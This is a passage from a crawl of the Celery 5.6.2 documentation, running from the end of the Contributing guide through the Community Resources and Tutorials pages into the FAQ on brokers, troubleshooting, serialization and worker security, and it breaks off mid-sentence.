add index.rst\n$ git commit celery.worker.awesome.rst index.rst \\\n    -m \"Adds reference for celery.worker.awesome\"\n\nIsort\n\nIsort is a python utility to help sort imports alphabetically and separated into sections. The Celery project uses isort to better maintain imports on every module. Please run isort if there are any new modules or the imports on an existent module had to be modified.\n\n$ isort my_module.py # Run isort for one file\n$ isort -rc . # Run it recursively\n$ isort m_module.py --diff # Do a dry-run to see the proposed changes\n\nCreating pull requests\n\nWhen your feature/bugfix is complete, you may want to submit a pull request, so that it can be reviewed by the maintainers.\n\nBefore submitting a pull request, please make sure you go through this checklist to make it easier for the maintainers to accept your proposed changes:\n\n[ ] Make sure any change or new feature has a unit and/or integration test.\n\nIf a test is not written, a label will be assigned to your PR with the name Needs Test Coverage.\n\n[ ] Make sure unit test coverage does not decrease.\n\npytest -xv --cov=celery --cov-report=xml --cov-report term. You can check the current test coverage here: https://codecov.io/gh/celery/celery\n\n[ ] Run pre-commit against the code. The following commands are valid\n\nand equivalent.:\n\n$ pre-commit run --all-files\n$ tox -e lint\n\n[ ] Build api docs to make sure everything is OK. The following commands are valid\n\nand equivalent.:\n\n$ make apicheck\n$ cd docs && sphinx-build -b apicheck -d _build/doctrees . _build/apicheck\n$ tox -e apicheck\n\n[ ] Build configcheck. The following commands are valid\n\nand equivalent.:\n\n$ make configcheck\n$ cd docs && sphinx-build -b configcheck -d _build/doctrees   . _build/configcheck\n$ tox -e configcheck\n\n[ ] Run bandit to make sure there’s no security issues. The following commands are valid\n\nand equivalent.:\n\n$ pip install -U bandit\n$ bandit -b bandit.json celery/\n$ tox -e bandit\n\n[ ] Run unit and integration tests for every python version. The following commands are valid\n\nand equivalent.:\n\n$ tox -v\n\n\n[ ] Confirm isort on any new or modified imports:\n\n$ isort my_module.py --diff\n\n\nCreating pull requests is easy, and they also let you track the progress of your contribution. Read the Pull Requests section in the GitHub Guide to learn how this is done.\n\nYou can also attach pull requests to existing issues by following the steps outlined here: https://bit.ly/koJoso\n\nYou can also use hub to create pull requests. Example: https://theiconic.tech/git-hub-fbe2e13ef4d1\n\nStatus Labels\n\nThere are different labels used to easily manage github issues and PRs. Most of these labels make it easy to categorize each issue with important details. For instance, you might see a Component:canvas label on an issue or PR. The Component:canvas label means the issue or PR corresponds to the canvas functionality. These labels are set by the maintainers and for the most part external contributors should not worry about them. A subset of these labels are prepended with Status:. Usually the Status: labels show important actions which the issue or PR needs. Here is a summary of such statuses:\n\nStatus: Cannot Reproduce\n\nOne or more Celery core team member has not been able to reproduce the issue.\n\nStatus: Confirmed\n\nThe issue or PR has been confirmed by one or more Celery core team member.\n\nStatus: Duplicate\n\nA duplicate issue or PR.\n\nStatus: Feedback Needed\n\nOne or more Celery core team member has asked for feedback on the issue or PR.\n\nStatus: Has Testcase\n\nIt has been confirmed the issue or PR includes a test case. This is particularly important to correctly write tests for any new feature or bug fix.\n\nStatus: In Progress\n\nThe PR is still in progress.\n\nStatus: Invalid\n\nThe issue reported or the PR is not valid for the project.\n\nStatus: Needs Documentation\n\nThe PR does not contain documentation for the feature or bug fix proposed.\n\nStatus: Needs Rebase\n\nThe PR has not been rebased with main. It is very important to rebase PRs before they can be merged to main to solve any merge conflicts.\n\nStatus: Needs Test Coverage\n\nCelery uses codecov to verify code coverage. Please make sure PRs do not decrease code coverage. This label will identify PRs which need code coverage.\n\nStatus: Needs Test Case\n\nThe issue or PR needs a test case. A test case can be a minimal code snippet that reproduces an issue or a detailed set of instructions and configuration values that reproduces the issue reported. If possible a test case can be submitted in the form of a PR to Celery’s integration suite. The test case will be marked as failed until the bug is fixed. When a test case cannot be run by Celery’s integration suite, then it’s better to describe in the issue itself.\n\nStatus: Needs Verification\n\nThis label is used to notify other users we need to verify the test case offered by the reporter and/or we need to include the test in our integration suite.\n\nStatus: Not a Bug\n\nIt has been decided the issue reported is not a bug.\n\nStatus: Won’t Fix\n\nIt has been decided the issue will not be fixed. Sadly the Celery project does not have unlimited resources and sometimes this decision has to be made. Although, any external contributors are invited to help out even if an issue or PR is labeled as Status: Won't Fix.\n\nStatus: Works For Me\n\nOne or more Celery core team members have confirmed the issue reported works for them.\n\nCoding Style\n\nYou should probably be able to pick up the coding style from surrounding code, but it is a good idea to be aware of the following conventions.\n\nAll Python code must follow the PEP 8 guidelines.\n\nhttps://pypi.org/project/pep8/ is a utility you can use to verify that your code is following the conventions.\n\nDocstrings must follow the PEP 257 conventions, and use the following style.\n\nDo this:\n\ndef method(self, arg):\n    \"\"\"Short description.\n\n    More details.\n\n    \"\"\"\n\n\nor:\n\ndef method(self, arg):\n    \"\"\"Short description.\"\"\"\n\n\nbut not this:\n\ndef method(self, arg):\n    \"\"\"\n    Short description.\n    \"\"\"\n\n\nLines shouldn’t exceed 78 columns.\n\nYou can enforce this in vim by setting the textwidth option:\n\nset textwidth=78\n\n\nIf adhering to this limit makes the code less readable, you have one more character to go on. This means 78 is a soft limit, and 79 is the hard limit :)\n\nImport order\n\nPython standard library (import xxx)\n\nPython standard library (from xxx import)\n\nThird-party packages.\n\nOther modules from the current package.\n\nor in case of code using Django:\n\nPython standard library (import xxx)\n\nPython standard library (from xxx import)\n\nThird-party packages.\n\nDjango packages.\n\nOther modules from the current package.\n\nWithin these sections the imports should be sorted by module name.\n\nExample:\n\nimport threading\nimport time\n\nfrom collections import deque\nfrom Queue import Queue, Empty\n\nfrom .platforms import Pidfile\nfrom .utils.time import maybe_timedelta\n\n\nWild-card imports must not be used (from xxx import *).\n\nFor distributions where Python 2.5 is the oldest support version, additional rules apply:\n\nAbsolute imports must be enabled at the top of every module:\n\nfrom __future__ import absolute_import\n\n\nIf the module uses the with statement and must be compatible with Python 2.5 (celery isn’t), then it must also enable that:\n\nfrom __future__ import with_statement\n\n\nEvery future import must be on its own line, as older Python 2.5 releases didn’t support importing multiple features on the same future import line:\n\n# Good\nfrom __future__ import absolute_import\nfrom __future__ import with_statement\n\n# Bad\nfrom __future__ import absolute_import, with_statement\n\n\n(Note that this rule doesn’t apply if the package doesn’t include support for Python 2.5)\n\nNote that we use “new-style” relative imports when the distribution doesn’t support Python versions below 2.5\n\nThis requires Python 2.5 or later:\n\nfrom . import submodule\n\nContributing features requiring additional libraries\n\nSome features like a new result backend may require additional libraries that the user must install.\n\nWe use setuptools extra_requires for this, and all new optional features that require third-party libraries must be added.\n\nAdd a new requirements file in requirements/extras\n\nFor the Cassandra backend this is requirements/extras/cassandra.txt, and the file looks like this:\n\npycassa\n\n\nThese are pip requirement files, so you can have version specifiers and multiple packages are separated by newline. A more complex example could be:\n\n# pycassa 2.0 breaks Foo\npycassa>=1.0,<2.0\nthrift\n\n\nModify setup.py\n\nAfter the requirements file is added, you need to add it as an option to setup.py in the extras_require section:\n\nextra['extras_require'] = {\n    # ...\n    'cassandra': extras('cassandra.txt'),\n}\n\n\nDocument the new feature in docs/includes/installation.txt\n\nYou must add your feature to the list in the Bundles section of docs/includes/installation.txt.\n\nAfter you’ve made changes to this file, you need to render the distro README file:\n\n$ pip install -U -r requirements/pkgutils.txt\n$ make readme\n\n\nThat’s all that needs to be done, but remember that if your feature adds additional configuration options, then these needs to be documented in docs/configuration.rst. Also, all settings need to be added to the celery/app/defaults.py module.\n\nResult backends require a separate section in the docs/configuration.rst file.\n\nContacts\n\nThis is a list of people that can be contacted for questions regarding the official git repositories, PyPI packages Read the Docs pages.\n\nIf the issue isn’t an emergency then it’s better to report an issue.\n\nCommitters\nAsk Solem\ngithub:\n\nhttps://github.com/ask\n\ntwitter:\n\nhttps://twitter.com/#!/asksol\n\nAsif Saif Uddin\ngithub:\n\nhttps://github.com/auvipy\n\ntwitter:\n\nhttps://twitter.com/#!/auvipy\n\nDmitry Malinovsky\ngithub:\n\nhttps://github.com/malinoff\n\ntwitter:\n\nhttps://twitter.com/__malinoff__\n\nIonel Cristian Mărieș\ngithub:\n\nhttps://github.com/ionelmc\n\ntwitter:\n\nhttps://twitter.com/ionelmc\n\nMher Movsisyan\ngithub:\n\nhttps://github.com/mher\n\ntwitter:\n\nhttps://twitter.com/#!/movsm\n\nOmer Katz\ngithub:\n\nhttps://github.com/thedrow\n\ntwitter:\n\nhttps://twitter.com/the_drow\n\nSteeve Morin\ngithub:\n\nhttps://github.com/steeve\n\ntwitter:\n\nhttps://twitter.com/#!/steeve\n\nJosue Balandrano Coronel\ngithub:\n\nhttps://github.com/xirdneh\n\ntwitter:\n\nhttps://twitter.com/eusoj_xirdneh\n\nTomer Nosrati\ngithub:\n\nhttps://github.com/Nusnus\n\ntwitter:\n\nhttps://x.com/tomer_nosrati\n\nWebsite\n\nThe Celery Project website is run and maintained by\n\nMauro Rocco\ngithub:\n\nhttps://github.com/fireantology\n\ntwitter:\n\nhttps://twitter.com/#!/fireantology\n\nwith design by:\n\nJan Henrik Helmers\nweb:\n\nhttp://www.helmersworks.com\n\ntwitter:\n\nhttps://twitter.com/#!/helmers\n\nPackages\ncelery\ngit:\n\nhttps://github.com/celery/celery\n\nCI:\n\nhttps://travis-ci.org/#!/celery/celery\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/celery\n\nPyPI:\n\nhttps://pypi.org/project/celery/\n\ndocs:\n\nhttps://docs.celeryq.dev\n\nkombu\n\nMessaging library.\n\ngit:\n\nhttps://github.com/celery/kombu\n\nCI:\n\nhttps://travis-ci.org/#!/celery/kombu\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/kombu\n\nPyPI:\n\nhttps://pypi.org/project/kombu/\n\ndocs:\n\nhttps://kombu.readthedocs.io\n\namqp\n\nPython AMQP 0.9.1 client.\n\ngit:\n\nhttps://github.com/celery/py-amqp\n\nCI:\n\nhttps://travis-ci.org/#!/celery/py-amqp\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/py-amqp\n\nPyPI:\n\nhttps://pypi.org/project/amqp/\n\ndocs:\n\nhttps://amqp.readthedocs.io\n\nvine\n\nPromise/deferred implementation.\n\ngit:\n\nhttps://github.com/celery/vine/\n\nCI:\n\nhttps://travis-ci.org/#!/celery/vine/\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/vine\n\nPyPI:\n\nhttps://pypi.org/project/vine/\n\ndocs:\n\nhttps://vine.readthedocs.io\n\npytest-celery\n\nPytest plugin for Celery.\n\ngit:\n\nhttps://github.com/celery/pytest-celery\n\nPyPI:\n\nhttps://pypi.org/project/pytest-celery/\n\ndocs:\n\nhttps://pytest-celery.readthedocs.io\n\nbilliard\n\nFork of multiprocessing containing improvements that’ll eventually be merged into the Python stdlib.\n\ngit:\n\nhttps://github.com/celery/billiard\n\nCI:\n\nhttps://travis-ci.org/#!/celery/billiard/\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/billiard\n\nPyPI:\n\nhttps://pypi.org/project/billiard/\n\ndjango-celery-beat\n\nDatabase-backed Periodic Tasks with admin interface using the Django ORM.\n\ngit:\n\nhttps://github.com/celery/django-celery-beat\n\nCI:\n\nhttps://travis-ci.org/#!/celery/django-celery-beat\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/django-celery-beat\n\nPyPI:\n\nhttps://pypi.org/project/django-celery-beat/\n\ndjango-celery-results\n\nStore task results in the Django ORM, or using the Django Cache Framework.\n\ngit:\n\nhttps://github.com/celery/django-celery-results\n\nCI:\n\nhttps://travis-ci.org/#!/celery/django-celery-results\n\nWindows-CI:\n\nhttps://ci.appveyor.com/project/ask/django-celery-results\n\nPyPI:\n\nhttps://pypi.org/project/django-celery-results/\n\nlibrabbitmq\n\nVery fast Python AMQP client written in C.\n\ngit:\n\nhttps://github.com/celery/librabbitmq\n\nPyPI:\n\nhttps://pypi.org/project/librabbitmq/\n\ncell\n\nActor library.\n\ngit:\n\nhttps://github.com/celery/cell\n\nPyPI:\n\nhttps://pypi.org/project/cell/\n\ncyme\n\nDistributed Celery Instance manager.\n\ngit:\n\nhttps://github.com/celery/cyme\n\nPyPI:\n\nhttps://pypi.org/project/cyme/\n\ndocs:\n\nhttps://cyme.readthedocs.io/\n\nDeprecated\n\ndjango-celery\n\ngit:\n\nhttps://github.com/celery/django-celery\n\nPyPI:\n\nhttps://pypi.org/project/django-celery/\n\ndocs:\n\nhttps://docs.celeryq.dev/en/latest/django\n\nFlask-Celery\n\ngit:\n\nhttps://github.com/ask/Flask-Celery\n\nPyPI:\n\nhttps://pypi.org/project/Flask-Celery/\n\ncelerymon\n\ngit:\n\nhttps://github.com/celery/celerymon\n\nPyPI:\n\nhttps://pypi.org/project/celerymon/\n\ncarrot\n\ngit:\n\nhttps://github.com/ask/carrot\n\nPyPI:\n\nhttps://pypi.org/project/carrot/\n\nghettoq\n\ngit:\n\nhttps://github.com/ask/ghettoq\n\nPyPI:\n\nhttps://pypi.org/project/ghettoq/\n\nkombu-sqlalchemy\n\ngit:\n\nhttps://github.com/ask/kombu-sqlalchemy\n\nPyPI:\n\nhttps://pypi.org/project/kombu-sqlalchemy/\n\ndjango-kombu\n\ngit:\n\nhttps://github.com/ask/django-kombu\n\nPyPI:\n\nhttps://pypi.org/project/django-kombu/\n\npylibrabbitmq\n\nOld name for https://pypi.org/project/librabbitmq/.\n\ngit:\n\nNone\n\nPyPI:\n\nhttps://pypi.org/project/pylibrabbitmq/\n\nRelease Procedure\nUpdating the version number\n\nThe version number must be updated in three places:\n\ncelery/__init__.py\n\ndocs/include/introduction.txt\n\nREADME.rst\n\nThe changes to the previous files can be handled with the [bumpversion command line tool] (https://pypi.org/project/bumpversion/). The corresponding configuration lives in .bumpversion.cfg. To do the necessary changes, run:\n\n$ bumpversion\n\n\nAfter you have changed these files, you must render the README files. There’s a script to convert sphinx syntax to generic reStructured Text syntax, and the make target readme does this for you:\n\n$ make readme\n\n\nNow commit the changes:\n\n$ git commit -a -m \"Bumps version to X.Y.Z\"\n\n\nand make a new version tag:\n\n$ git tag vX.Y.Z\n$ git push --tags\n\nReleasing\n\nCommands to make a new public stable release:\n\n$ make distcheck  # checks pep8, autodoc index, runs tests and more\n$ make dist  # NOTE: Runs git clean -xdf and removes files not in the repo.\n$ python setup.py sdist upload --sign --identity='Celery Security Team'\n$ python setup.py bdist_wheel upload --sign --identity='Celery Security Team'\n\n\nIf this is a new release series then you also need to do the following:\n\nGo to the Read The Docs management interface at:\n\nhttps://readthedocs.org/projects/celery/?fromdocs=celery\n\nEnter “Edit project”\n\nChange default branch to the branch of this series, for example, use the 2.4 branch for the 2.4 series.\n\nAlso add the previous version under the “versions” tab.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nFirst steps with Django\n\nNext topic\n\nCommunity Resources\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Contributing\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491587,
    "timestamp": "2026-02-23T00:13:49.424Z",
    "title": "Community Resources — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/community.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Community Resources\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nCommunity Resources\n\nThis is a list of external blog posts, tutorials, and slides related to Celery. If you have a link that’s missing from this list, please contact the mailing-list or submit a patch.\n\nResources\n\nWho’s using Celery\n\nWiki\n\nCelery questions on Stack Overflow\n\nMailing-list Archive: celery-users\n\nNews\n\nResources\nWho’s using Celery\n\nhttps://github.com/celery/celery/wiki#companieswebsites-using-celery\n\nWiki\n\nhttps://github.com/celery/celery/wiki\n\nCelery questions on Stack Overflow\n\nhttps://stackoverflow.com/search?q=celery&tab=newest\n\nMailing-list Archive: celery-users\n\nhttp://blog.gmane.org/gmane.comp.python.amqp.celery.user\n\nNews\n\nThis section has moved to the Celery homepage: http://celeryproject.org/community/\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nContributing\n\nNext topic\n\nTutorials\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Community Resources\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491588,
    "timestamp": "2026-02-23T00:13:49.425Z",
    "title": "Tutorials — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/tutorials/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Tutorials\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nTutorials\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nTask Cookbook\nEnsuring a task is only executed one at a time\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nCommunity Resources\n\nNext topic\n\nTask Cookbook\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Tutorials\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491589,
    "timestamp": "2026-02-23T00:13:49.432Z",
    "title": "Frequently Asked Questions — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/faq.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Frequently Asked Questions\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nFrequently Asked Questions\n\nGeneral\n\nWhat kinds of things should I use Celery for?\n\nMisconceptions\n\nDoes Celery really consist of 50.000 lines of code?\n\nDoes Celery have many dependencies?\n\ncelery\n\nkombu\n\nIs Celery heavy-weight?\n\nIs Celery dependent on pickle?\n\nIs Celery for Django only?\n\nDo I have to use AMQP/RabbitMQ?\n\nIs Celery multilingual?\n\nTroubleshooting\n\nMySQL is throwing deadlock errors, what can I do?\n\nThe worker isn’t doing anything, just hanging\n\nTask results aren’t reliably returning\n\nWhy is Task.delay/apply*/the worker just hanging?\n\nDoes it work on FreeBSD?\n\nI’m having IntegrityError: Duplicate Key errors. Why?\n\nWhy aren’t my tasks processed?\n\nWhy won’t my Task run?\n\nWhy won’t my periodic task run?\n\nHow do I purge all waiting tasks?\n\nI’ve purged messages, but there are still messages left in the queue?\n\nResults\n\nHow do I get the result of a task if I have the ID that points there?\n\nSecurity\n\nIsn’t using pickle a security concern?\n\nCan messages be encrypted?\n\nIs it safe to run celery worker as root?\n\nBrokers\n\nWhy is RabbitMQ crashing?\n\nCan I use Celery with ActiveMQ/STOMP?\n\nWhat features aren’t supported when not using an AMQP broker?\n\nTasks\n\nHow can I reuse the same connection when calling tasks?\n\nsudo in a subprocess returns None\n\nWhy do workers delete tasks from the queue if they’re unable to process them?\n\nCan I call a task by name?\n\nCan I get the task id of the current task?\n\nCan I specify a custom task_id?\n\nCan I use decorators with tasks?\n\nCan I use natural task ids?\n\nCan I run a task once another task has finished?\n\nCan I cancel the execution of a task?\n\nWhy aren’t my remote control commands received by all workers?\n\nCan I send some tasks to only some servers?\n\nCan I disable prefetching of tasks?\n\nCan I change the interval of a periodic task at runtime?\n\nDoes Celery support task priorities?\n\nShould I use retry or acks_late?\n\nCan I schedule tasks to execute at a specific time?\n\nCan I safely shut down the worker?\n\nCan I run the worker in the background on [platform]?\n\nDjango\n\nWhat purpose does the database tables created by django-celery-beat have?\n\nWhat purpose does the database tables created by django-celery-results have?\n\nWindows\n\nDoes Celery support Windows?\n\nGeneral\nWhat kinds of things should I use Celery for?\n\nAnswer: Queue everything and delight everyone is a good article describing why you’d use a queue in a web context.\n\nThese are some common use cases:\n\nRunning something in the background. For example, to finish the web request as soon as possible, then update the users page incrementally. This gives the user the impression of good performance and “snappiness”, even though the real work might actually take some time.\n\nRunning something after the web request has finished.\n\nMaking sure something is done, by executing it asynchronously and using retries.\n\nScheduling periodic work.\n\nAnd to some degree:\n\nDistributed computing.\n\nParallel execution.\n\nMisconceptions\nDoes Celery really consist of 50.000 lines of code?\n\nAnswer: No, this and similarly large numbers have been reported at various locations.\n\nThe numbers as of this writing are:\n\ncore: 7,141 lines of code.\n\ntests: 14,209 lines.\n\nbackends, contrib, compat utilities: 9,032 lines.\n\nLines of code isn’t a useful metric, so even if Celery did consist of 50k lines of code you wouldn’t be able to draw any conclusions from such a number.\n\nDoes Celery have many dependencies?\n\nA common criticism is that Celery uses too many dependencies. The rationale behind such a fear is hard to imagine, especially considering code reuse as the established way to combat complexity in modern software development, and that the cost of adding dependencies is very low now that package managers like pip and PyPI makes the hassle of installing and maintaining dependencies a thing of the past.\n\nCelery has replaced several dependencies along the way, and the current list of dependencies are:\n\ncelery\n\nhttps://pypi.org/project/kombu/\n\nKombu is part of the Celery ecosystem and is the library used to send and receive messages. It’s also the library that enables us to support many different message brokers. It’s also used by the OpenStack project, and many others, validating the choice to separate it from the Celery code-base.\n\nhttps://pypi.org/project/billiard/\n\nBilliard is a fork of the Python multiprocessing module containing many performance and stability improvements. It’s an eventual goal that these improvements will be merged back into Python one day.\n\nIt’s also used for compatibility with older Python versions that don’t come with the multiprocessing module.\n\nkombu\n\nKombu depends on the following packages:\n\nhttps://pypi.org/project/amqp/\n\nThe underlying pure-Python amqp client implementation. AMQP being the default broker this is a natural dependency.\n\nNote\n\nTo handle the dependencies for popular configuration choices Celery defines a number of “bundle” packages, see Bundles.\n\nIs Celery heavy-weight?\n\nCelery poses very little overhead both in memory footprint and performance.\n\nBut please note that the default configuration isn’t optimized for time nor space, see the Optimizing guide for more information.\n\nIs Celery dependent on pickle?\n\nAnswer: No, Celery can support any serialization scheme.\n\nWe have built-in support for JSON, YAML, Pickle, and msgpack. Every task is associated with a content type, so you can even send one task using pickle, another using JSON.\n\nThe default serialization support used to be pickle, but since 4.0 the default is now JSON. If you require sending complex Python objects as task arguments, you can use pickle as the serialization format, but see notes in Serializers.\n\nIf you need to communicate with other languages you should use a serialization format suited to that task, which pretty much means any serializer that’s not pickle.\n\nYou can set a global default serializer, the default serializer for a particular Task, or even what serializer to use when sending a single task instance.\n\nIs Celery for Django only?\n\nAnswer: No, you can use Celery with any framework, web or otherwise.\n\nDo I have to use AMQP/RabbitMQ?\n\nAnswer: No, although using RabbitMQ is recommended you can also use Redis, SQS, or Qpid.\n\nSee Backends and Brokers for more information.\n\nRedis as a broker won’t perform as well as an AMQP broker, but the combination RabbitMQ as broker and Redis as a result store is commonly used. If you have strict reliability requirements you’re encouraged to use RabbitMQ or another AMQP broker. Some transports also use polling, so they’re likely to consume more resources. However, if you for some reason aren’t able to use AMQP, feel free to use these alternatives. They will probably work fine for most use cases, and note that the above points are not specific to Celery; If using Redis/database as a queue worked fine for you before, it probably will now. You can always upgrade later if you need to.\n\nIs Celery multilingual?\n\nAnswer: Yes.\n\nworker is an implementation of Celery in Python. If the language has an AMQP client, there shouldn’t be much work to create a worker in your language. A Celery worker is just a program connecting to the broker to process messages.\n\nAlso, there’s another way to be language-independent, and that’s to use REST tasks, instead of your tasks being functions, they’re URLs. With this information you can even create simple web servers that enable preloading of code. Simply expose an endpoint that performs an operation, and create a task that just performs an HTTP request to that endpoint.\n\nYou can also use Flower’s REST API to invoke tasks.\n\nTroubleshooting\nMySQL is throwing deadlock errors, what can I do?\n\nAnswer: MySQL has default isolation level set to REPEATABLE-READ, if you don’t really need that, set it to READ-COMMITTED. You can do that by adding the following to your my.cnf:\n\n[mysqld]\ntransaction-isolation = READ-COMMITTED\n\n\nFor more information about InnoDB’s transaction model see MySQL - The InnoDB Transaction Model and Locking in the MySQL user manual.\n\n(Thanks to Honza Kral and Anton Tsigularov for this solution)\n\nThe worker isn’t doing anything, just hanging\n\nAnswer: See MySQL is throwing deadlock errors, what can I do?, or Why is Task.delay/apply*/the worker just hanging?.\n\nTask results aren’t reliably returning\n\nAnswer: If you’re using the database backend for results, and in particular using MySQL, see MySQL is throwing deadlock errors, what can I do?.\n\nWhy is Task.delay/apply*/the worker just hanging?\n\nAnswer: There’s a bug in some AMQP clients that’ll make it hang if it’s not able to authenticate the current user, the password doesn’t match or the user doesn’t have access to the virtual host specified. Be sure to check your broker logs (for RabbitMQ that’s /var/log/rabbitmq/rabbit.log on most systems), it usually contains a message describing the reason.\n\nDoes it work on FreeBSD?\n\nAnswer: Depends;\n\nWhen using the RabbitMQ (AMQP) and Redis transports it should work out of the box.\n\nFor other transports the compatibility prefork pool is used and requires a working POSIX semaphore implementation, this is enabled in FreeBSD by default since FreeBSD 8.x. For older version of FreeBSD, you have to enable POSIX semaphores in the kernel and manually recompile billiard.\n\nLuckily, Viktor Petersson has written a tutorial to get you started with Celery on FreeBSD here: http://www.playingwithwire.com/2009/10/how-to-get-celeryd-to-work-on-freebsd/\n\nI’m having IntegrityError: Duplicate Key errors. Why?\n\nAnswer: See MySQL is throwing deadlock errors, what can I do?. Thanks to @@howsthedotcom.\n\nWhy aren’t my tasks processed?\n\nAnswer: With RabbitMQ you can see how many consumers are currently receiving tasks by running the following command:\n\n$ rabbitmqctl list_queues -p <myvhost> name messages consumers\nListing queues ...\ncelery     2891    2\n\n\nThis shows that there’s 2891 messages waiting to be processed in the task queue, and there are two consumers processing them.\n\nOne reason that the queue is never emptied could be that you have a stale worker process taking the messages hostage. This could happen if the worker wasn’t properly shut down.\n\nWhen a message is received by a worker the broker waits for it to be acknowledged before marking the message as processed. The broker won’t re-send that message to another consumer until the consumer is shut down properly.\n\nIf you hit this problem you have to kill all workers manually and restart them:\n\n$ pkill 'celery worker'\n\n$ # - If you don't have pkill use:\n$ # ps auxww | awk '/celery worker/ {print $2}' | xargs kill\n\n\nYou may have to wait a while until all workers have finished executing tasks. If it’s still hanging after a long time you can kill them by force with:\n\n$ pkill -9 'celery worker'\n\n$ # - If you don't have pkill use:\n$ # ps auxww | awk '/celery worker/ {print $2}' | xargs kill -9\n\nWhy won’t my Task run?\n\nAnswer: There might be syntax errors preventing the tasks module being imported.\n\nYou can find out if Celery is able to run the task by executing the task manually:\n\n>>> from myapp.tasks import MyPeriodicTask\n>>> MyPeriodicTask.delay()\n\n\nWatch the workers log file to see if it’s able to find the task, or if some other error is happening.\n\nWhy won’t my periodic task run?\n\nAnswer: See Why won’t my Task run?.\n\nHow do I purge all waiting tasks?\n\nAnswer: You can use the celery purge command to purge all configured task queues:\n\n$ celery -A proj purge\n\n\nor programmatically:\n\n>>> from proj.celery import app\n>>> app.control.purge()\n1753\n\n\nIf you only want to purge messages from a specific queue you have to use the AMQP API or the celery amqp utility:\n\n$ celery -A proj amqp queue.purge <queue name>\n\n\nThe number 1753 is the number of messages deleted.\n\nYou can also start the worker with the --purge option enabled to purge messages when the worker starts.\n\nI’ve purged messages, but there are still messages left in the queue?\n\nAnswer: Tasks are acknowledged (removed from the queue) as soon as they’re actually executed. After the worker has received a task, it will take some time until it’s actually executed, especially if there are a lot of tasks already waiting for execution. Messages that aren’t acknowledged are held on to by the worker until it closes the connection to the broker (AMQP server). When that connection is closed (e.g., because the worker was stopped) the tasks will be re-sent by the broker to the next available worker (or the same worker when it has been restarted), so to properly purge the queue of waiting tasks you have to stop all the workers, and then purge the tasks using celery.control.purge().\n\nResults\nHow do I get the result of a task if I have the ID that points there?\n\nAnswer: Use task.AsyncResult:\n\n>>> result = my_task.AsyncResult(task_id)\n>>> result.get()\n\n\nThis will give you a AsyncResult instance using the tasks current result backend.\n\nIf you need to specify a custom result backend, or you want to use the current application’s default backend you can use app.AsyncResult:\n\n>>> result = app.AsyncResult(task_id)\n>>> result.get()\n\nSecurity\nIsn’t using pickle a security concern?\n\nAnswer: Indeed, since Celery 4.0 the default serializer is now JSON to make sure people are choosing serializers consciously and aware of this concern.\n\nIt’s essential that you protect against unauthorized access to your broker, databases and other services transmitting pickled data.\n\nNote that this isn’t just something you should be aware of with Celery, for example also Django uses pickle for its cache client.\n\nFor the task messages you can set the task_serializer setting to “json” or “yaml” instead of pickle.\n\nSimilarly for task results you can set result_serializer.\n\nFor more details of the formats used and the lookup order when checking what format to use for a task see Serializers\n\nCan messages be encrypted?\n\nAnswer: Some AMQP brokers supports using SSL (including RabbitMQ). You can enable this using the broker_use_ssl setting.\n\nIt’s also possible to add additional encryption and security to messages, if you have a need for this then you should contact the mailing-list.\n\nIs it safe to run celery worker as root?\n\nAnswer: No!\n\nWe’re not currently aware of any security issues, but it would be incredibly naive to assume that they don’t exist, so running the Celery services (celery worker, celery beat, celeryev, etc) as an unprivileged user is recommended.\n\nBrokers\nWhy is RabbitMQ crashing?\n\nAnswer: RabbitMQ will crash if it runs out of memory. This will be fixed in a future release of RabbitMQ. please refer to the RabbitMQ FAQ: https://www.rabbitmq.com/faq.html#node-runs-out-of-memory\n\nNote\n\nThis is no longer the case, RabbitMQ versions 2.0 and above includes a new persister, that’s tolerant to out of memory errors. RabbitMQ 2.1 or higher is recommended for Celery.\n\nIf you’re still running an older version of RabbitMQ and experience crashes, then please upgrade!\n\nMisconfiguration of Celery can eventually lead to a crash on older version of RabbitMQ. Even if it doesn’t crash, this can still consume a lot of resources, so it’s important that you’re aware of the common pitfalls.\n\nEvents.\n\nRunning worker with the -E option will send messages for events happening inside of the worker.\n\nEvents should only be enabled if you have an active monitor consuming them, or if you purge the event queue periodically.\n\nAMQP backend results.\n\nWhen running with the AMQP result backend, every task result will be sent as a message. If you don’t collect these results, they will build up and RabbitMQ will eventually run out of memory.\n\nThis result backend is now deprecated so you shouldn’t be using it. Use either the RPC backend for rpc-style calls, or a persistent backend if you need multi-consumer access to results.\n\nResults expire after 1 day by default. It may be a good idea to lower this value by configuring the result_expires setting.\n\nIf you don’t use the results for a task, make sure you set the ignore_result option:\n\n@app.task(ignore_result=True)\ndef mytask():\n    pass\n\nclass MyTask(Task):\n    ignore_result = True\n\nCan I use Celery with ActiveMQ/STOMP?\n\nAnswer: No. It used to be supported by https://pypi.org/project/Carrot/ (our old messaging library) but isn’t currently supported in https://pypi.org/project/Kombu/ (our new messaging library).\n\nWhat features aren’t supported when not using an AMQP 